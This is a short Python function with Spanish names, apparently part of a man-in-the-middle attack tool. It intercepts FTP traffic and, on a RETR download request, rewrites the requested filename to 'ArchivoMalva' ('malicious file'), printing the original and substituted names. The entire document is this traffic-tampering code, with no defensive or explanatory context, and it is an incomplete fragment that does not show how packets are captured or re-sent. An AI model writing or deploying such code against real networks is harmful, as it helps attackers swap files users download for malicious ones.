def cambiar_archivo(packet):
	try:
		if packet['FTP']['request.command'] == 'RETR':
			print("Archivo Real")
			print (packet['FTP']['request.arg'])
			packet['FTP']['request.arg'] = "ArchivoMalva"
			print ("Archivo cambiado por : ")
			print (packet['FTP']['request.arg'])
			return packet
	except:
		return None
